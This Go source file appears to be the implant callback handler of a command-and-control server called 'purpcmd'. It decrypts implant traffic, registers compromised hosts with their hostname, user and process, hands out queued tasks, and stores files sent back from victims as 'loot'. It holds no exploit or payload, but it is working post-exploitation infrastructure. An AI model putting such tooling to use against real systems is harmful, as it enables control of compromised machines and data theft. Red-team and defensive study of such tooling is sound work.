package callback

import (
	"bytes"
	"encoding/base64"
	"encoding/binary"
	"errors"
	"fmt"
	"io"
	"net/http"
	"strings"
	"time"

	impx "purpcmd/implant"
	"purpcmd/internal"
	"purpcmd/internal/encrypt"
	"purpcmd/internal/protocol"
	"purpcmd/pkg/teamapi"
	"purpcmd/server/db"
	"purpcmd/server/implant"
	"purpcmd/server/log"
	"purpcmd/server/loot"
	"purpcmd/server/lua"
)

const (
	MaxEncodedPayloadSize      = protocol.MaxEncodedPacketSize
	maxDecodedPayloadSize      = protocol.MaxAuthenticatedPacketSize
	maxRegistrationDataSize    = 4 << 10
	maxResponsePayloadSize     = protocol.MaxPayloadSize
	maxLootFileNameSize        = protocol.MaxFileNameSize
	maxLootContentSize         = protocol.MaxPayloadSize
	callbackHMACSize           = 16
	minimumAuthenticatedPacket = callbackHMACSize + 16
)

var ErrMalformedPayload = errors.New("malformed callback payload")

// TransportContext identifies the transport that delivered a callback. It
// contains routing metadata only; callback authentication still comes from
// the encrypted protocol frame.
type TransportContext struct {
	Kind     string
	Name     string
	UUID     string
	Protocol string
	Profile  string

	// Listener fields are retained for source compatibility with older driver
	// integrations. New transports should use Kind, Name, UUID, and Protocol.
	ListenerName  string
	ListenerUUID  string
	Transport     string
	RemoteAddress string
}

type ParseResult struct {
	MessageType uint16
	Task        []byte
	Session     string
}

func malformed(format string, args ...any) error {
	return fmt.Errorf("%w: %s", ErrMalformedPayload, fmt.Sprintf(format, args...))
}

func ParseCallback(encoded []byte, req *http.Request, authenticatedName string) (messageType uint16, task []byte, err error) {
	transport := TransportContext{}
	if req != nil {
		transport.RemoteAddress = req.RemoteAddr
	}
	return ParseCallbackWithContext(encoded, transport, authenticatedName)
}

// ParseCallbackWithContext processes one callback independently of its network
// transport. Drivers are responsible only for extracting encoded and session
// data and for carrying the returned task bytes.
func ParseCallbackWithContext(encoded []byte, transport TransportContext, authenticatedName string) (messageType uint16, task []byte, err error) {
	result, err := ParseCallbackDetailed(encoded, transport, authenticatedName)
	return result.MessageType, result.Task, err
}

// ParseCallbackDetailed exposes the registered session name in addition to
// the legacy parser result. Speaker first-blood uses it to attach its worker
// without decoding or redefining the REG packet in the transport layer.
func ParseCallbackDetailed(encoded []byte, transport TransportContext, authenticatedName string) (result ParseResult, err error) {
	defer func() {
		if recovered := recover(); recovered != nil {
			result = ParseResult{MessageType: internal.NIL}
			err = malformed("recovered parser panic: %v", recovered)
		}
	}()

	decoded, err := decodePayload(encoded)
	if err != nil {
		return ParseResult{}, err
	}

	var plaintext []byte
	if authenticatedName == "" {
		var rsaEncryption encrypt.Encrypt
		plaintext, err = rsaEncryption.RSADecode(decoded)
		if err != nil {
			return ParseResult{}, malformed("registration decrypt failed: %v", err)
		}
	} else {
		imp := implant.ImplantPtrByName(authenticatedName)
		if imp == nil {
			return ParseResult{}, malformed("unknown session")
		}
		if len(decoded) < minimumAuthenticatedPacket {
			return ParseResult{}, malformed("authenticated packet is too short")
		}
		if !imp.Enc.HMACVerifyHash(decoded) {
			return ParseResult{}, malformed("HMAC verification failed")
		}

		ciphertext := decoded[:len(decoded)-callbackHMACSize]
		plaintext, err = imp.Enc.AESCbcDecrypt(ciphertext)
		if err != nil {
			return ParseResult{}, malformed("session decrypt failed: %v", err)
		}
	}

	reader := bytes.NewReader(plaintext)
	if err := readBinary(reader, &result.MessageType, "message type"); err != nil {
		return ParseResult{}, err
	}
	if authenticatedName == "" && result.MessageType != internal.REG {
		return ParseResult{}, malformed("registration endpoint received message type %d", result.MessageType)
	}
	if authenticatedName != "" && result.MessageType == internal.REG {
		return ParseResult{}, malformed("session endpoint received registration message")
	}

	result.Session = authenticatedName
	switch result.MessageType {
	case internal.REG:
		result.Session, err = parseAndRegWithContext(reader, transport)
	case internal.CHK:
		result.Task, err = ParseCheck(reader, authenticatedName)
	case internal.RSP:
		err = ParseResponse(reader, authenticatedName)
	case internal.CHU:
		err = ParseChunkData(reader, authenticatedName)
	default:
		err = malformed("unknown message type %d", result.MessageType)
	}
	if err != nil {
		return ParseResult{}, err
	}
	return result, nil
}

func decodePayload(encoded []byte) ([]byte, error) {
	if len(encoded) == 0 {
		return nil, malformed("empty encoded payload")
	}
	if len(encoded) > MaxEncodedPayloadSize {
		return nil, malformed("encoded payload exceeds %d bytes", MaxEncodedPayloadSize)
	}
	for _, value := range encoded {
		if !((value >= 'A' && value <= 'Z') || (value >= 'a' && value <= 'z') ||
			(value >= '0' && value <= '9') || value == '+' || value == '/' || value == '=') {
			return nil, malformed("payload is not canonical base64")
		}
	}

	decoded, err := base64.StdEncoding.Strict().DecodeString(string(encoded))
	if err != nil {
		return nil, malformed("invalid base64: %v", err)
	}
	if len(decoded) > maxDecodedPayloadSize {
		return nil, malformed("decoded payload exceeds %d bytes", maxDecodedPayloadSize)
	}
	return decoded, nil
}

func readBinary(reader io.Reader, destination any, field string) error {
	if err := binary.Read(reader, binary.BigEndian, destination); err != nil {
		return malformed("read %s: %v", field, err)
	}
	return nil
}

func readSizedBytes(reader *bytes.Reader, length uint64, maximum uint64, field string) ([]byte, error) {
	if length > maximum {
		return nil, malformed("%s length %d exceeds maximum %d", field, length, maximum)
	}
	if length > uint64(reader.Len()) {
		return nil, malformed("%s length %d exceeds remaining packet size %d", field, length, reader.Len())
	}
	data := make([]byte, int(length))
	if _, err := io.ReadFull(reader, data); err != nil {
		return nil, malformed("read %s: %v", field, err)
	}
	return data, nil
}

func requireConsumed(reader *bytes.Reader) error {
	if reader.Len() != 0 {
		return malformed("packet contains %d trailing bytes", reader.Len())
	}
	return nil
}

func ParseMetadata(reader io.Reader, metadata *impx.ImplantMetadata) error {
	if err := protocol.ReadMetadata(reader, metadata); err != nil {
		return malformed("%v", err)
	}
	return nil
}

func ParseAndReg(reader *bytes.Reader, req *http.Request) error {
	transport := TransportContext{}
	if req != nil {
		transport.RemoteAddress = req.RemoteAddr
	}
	return ParseAndRegWithContext(reader, transport)
}

func ParseAndRegWithContext(reader *bytes.Reader, transport TransportContext) error {
	_, err := parseAndRegWithContext(reader, transport)
	return err
}

func parseAndRegWithContext(reader *bytes.Reader, transport TransportContext) (string, error) {
	metadata := new(impx.ImplantMetadata)
	if err := ParseMetadata(reader, metadata); err != nil {
		return "", err
	}

	var aesKey [16]byte
	var aesIV [16]byte
	if err := readBinary(reader, &aesKey, "AES key"); err != nil {
		return "", err
	}
	if err := readBinary(reader, &aesIV, "AES IV"); err != nil {
		return "", err
	}

	var dataLength uint16
	if err := readBinary(reader, &dataLength, "registration data length"); err != nil {
		return "", err
	}
	data, err := readSizedBytes(reader, uint64(dataLength), maxRegistrationDataSize, "registration data")
	if err != nil {
		return "", err
	}
	if err := requireConsumed(reader); err != nil {
		return "", err
	}

	entities := bytes.Split(data, internal.SEP)
	if len(entities) != 4 {
		return "", malformed("registration data must contain exactly four entities")
	}
	metadata.Proc = string(entities[0])
	metadata.Hostname = string(entities[1])
	metadata.User = string(entities[2])
	payloadType := string(entities[3])
	if err := internal.ValidatePayloadType(payloadType); err != nil {
		return "", malformed("invalid payload type: %v", err)
	}
	metadata.Type = payloadType

	profile := strings.TrimSpace(transport.Profile)
	if profile != "" {
		definition, err := db.DBImplantDefinitionGet(profile)
		if err != nil {
			return "", malformed("registration profile: %v", err)
		}
		if definition.PayloadType != metadata.Type {
			return "", malformed("registration payload type %q does not match profile %q", metadata.Type, profile)
		}
	}

	name := fmt.Sprintf("%d", metadata.SessionID)
	kind, transportName, transportID := normalizedTransport(transport)
	replaceDeadSession := false
	if existing := implant.ImplantPtrByName(name); existing != nil {
		session, err := implant.APIGetSession(name)
		if err != nil {
			return "", malformed("inspect existing session: %v", err)
		}
		sameSpeaker := kind == teamapi.SessionTransportSpeaker && session.Transport == teamapi.SessionTransportSpeaker &&
			((transportID != "" && session.SpeakerUUID == transportID) || (transportID == "" && session.Speaker == transportName))
		if sameSpeaker {
			existing.ImplantSetMetadata(metadata)
			existing.ImplantSetEncryption(encrypt.EncryptImport(aesKey, aesIV))
			existing.ImplantSetSpeaker(transportName, transportID)
			if transport.RemoteAddress != "" {
				existing.ImplantSetRemoteSocket(transport.RemoteAddress)
			}
			existing.ImplantUpdateLastseen()
			return name, nil
		}
		if session.Alive {
			return "", malformed("session already exists")
		}
		replaceDeadSession = true
	}
	if profile != "" {
		if err := db.DBImplantDefinitionValidateAndConsumeOTS(profile, metadata.OTS, time.Now().UTC()); err != nil {
			return "", malformed("registration one-time secret: %v", err)
		}
	}
	if replaceDeadSession {
		if err := implant.APIDeleteSession(name); err != nil {
			return "", malformed("replace dead session: %v", err)
		}
	}

	imp := implant.ImplantNew(name)
	imp.ImplantSetMetadata(metadata)
	imp.ImplantSetEncryption(encrypt.EncryptImport(aesKey, aesIV))
	if transport.RemoteAddress != "" {
		imp.ImplantSetRemoteSocket(transport.RemoteAddress)
	}
	if kind == teamapi.SessionTransportSpeaker {
		imp.ImplantSetSpeaker(transportName, transportID)
	} else if transportName != "" || transportID != "" {
		imp.ImplantSetListener(transportName, transportID)
	}
	imp.ImplantAddImplant()

	lua.LuaOnRegister(*imp)
	log.AsyncWriteStdout(fmt.Sprintf("[\u001B[1;32m!\u001B[0;0m]- New implant %s - SOCK:%s HOSTNAME:%s USERNAME:%s TYPE:%s\n",
		imp.Name, imp.Metadata.Socket, imp.Metadata.Hostname, imp.Metadata.User, imp.Metadata.Type))
	return name, nil
}

func normalizedTransport(transport TransportContext) (kind, name, id string) {
	kind, name, id = transport.Kind, transport.Name, transport.UUID
	if kind == "" && (transport.ListenerName != "" || transport.ListenerUUID != "") {
		kind, name, id = teamapi.SessionTransportListener, transport.ListenerName, transport.ListenerUUID
	}
	if kind == "" {
		kind = teamapi.SessionTransportListener
	}
	return kind, name, id
}

func validateSession(metadata *impx.ImplantMetadata, authenticatedName string) (*implant.Implant, error) {
	name := fmt.Sprintf("%d", metadata.SessionID)
	if authenticatedName == "" || name != authenticatedName {
		return nil, malformed("encrypted session ID does not match authenticated session")
	}
	imp := implant.ImplantPtrByName(authenticatedName)
	if imp == nil {
		return nil, malformed("unknown session")
	}
	return imp, nil
}

// ParseCheck parses a health check after its cryptographic envelope has been authenticated.
func ParseCheck(reader *bytes.Reader, authenticatedName string) ([]byte, error) {
	metadata := new(impx.ImplantMetadata)
	if err := ParseMetadata(reader, metadata); err != nil {
		return nil, err
	}
	if err := requireConsumed(reader); err != nil {
		return nil, err
	}
	imp, err := validateSession(metadata, authenticatedName)
	if err != nil {
		return nil, err
	}
	imp.ImplantUpdateLastseen()

	data, taskID, err := imp.ImplantGetTaskStr()
	if err != nil {
		return nil, nil
	}
	lua.LuaOnCheck(taskID, data, *imp)
	log.AsyncWriteStdoutInfo(fmt.Sprintf("Sending task %s of %d bytes to %s\n", string(taskID[:]), len(data), imp.Name))
	return []byte(data), nil
}

func ParseResponse(reader *bytes.Reader, authenticatedName string) error {
	metadata := new(impx.ImplantMetadata)
	if err := ParseMetadata(reader, metadata); err != nil {
		return err
	}

	var taskID [8]byte
	if err := readBinary(reader, &taskID, "task ID"); err != nil {
		return err
	}
	var responseLength uint32
	if err := readBinary(reader, &responseLength, "response length"); err != nil {
		return err
	}
	response, err := readSizedBytes(reader, uint64(responseLength), maxResponsePayloadSize, "response")
	if err != nil {
		return err
	}
	if err := requireConsumed(reader); err != nil {
		return err
	}

	imp, err := validateSession(metadata, authenticatedName)
	if err != nil {
		return err
	}
	accepted, err := imp.TaskBeginResponse(taskID)
	if err != nil {
		return err
	}
	if !accepted {
		return nil
	}
	defer imp.TaskAbortResponse(taskID)

	if err := imp.TaskCompleteResponse(taskID, response); err != nil {
		return err
	}
	imp.ImplantUpdateLastseen()
	lua.LuaOnResponse(taskID, string(response), *imp)
	log.AsyncWriteStdoutInfo(fmt.Sprintf("Response - session:%s task:%s length:%d\n", authenticatedName, taskID, responseLength))
	return nil
}

func ParseChunkData(reader *bytes.Reader, authenticatedName string) error {
	metadata := new(impx.ImplantMetadata)
	if err := ParseMetadata(reader, metadata); err != nil {
		return err
	}

	var taskID [8]byte
	if err := readBinary(reader, &taskID, "task ID"); err != nil {
		return err
	}
	var fileNameLength uint32
	if err := readBinary(reader, &fileNameLength, "file name length"); err != nil {
		return err
	}
	fileName, err := readSizedBytes(reader, uint64(fileNameLength), maxLootFileNameSize, "file name")
	if err != nil {
		return err
	}
	var contentLength uint32
	if err := readBinary(reader, &contentLength, "content length"); err != nil {
		return err
	}
	content, err := readSizedBytes(reader, uint64(contentLength), maxLootContentSize, "content")
	if err != nil {
		return err
	}
	if err := requireConsumed(reader); err != nil {
		return err
	}

	imp, err := validateSession(metadata, authenticatedName)
	if err != nil {
		return err
	}
	accepted, err := imp.TaskBeginResponse(taskID)
	if err != nil {
		return err
	}
	if !accepted {
		return nil
	}
	defer imp.TaskAbortResponse(taskID)

	lootEntry := loot.New(authenticatedName, string(fileName), content)
	if err := lootEntry.SaveData(); err != nil {
		log.AsyncWriteStdoutAlert(fmt.Sprintf("Failed to save loot - session:%s task:%s file:%s error:%s", authenticatedName, taskID, string(fileName), err.Error()))
		return err
	}

	response := []byte(fmt.Sprintf("File downloaded: %s (%d bytes) - UUID: %s", string(fileName), contentLength, lootEntry.UUID))
	if err := imp.TaskCompleteResponse(taskID, response); err != nil {
		return err
	}
	imp.ImplantUpdateLastseen()
	lua.LuaOnResponse(taskID, fmt.Sprintf("Downloaded: %s", string(fileName)), *imp)
	log.AsyncWriteStdoutSuccs(fmt.Sprintf("File downloaded - session:%s task:%s file:%s size:%d bytes UUID:%s", authenticatedName, taskID, string(fileName), contentLength, lootEntry.UUID))
	return nil
}
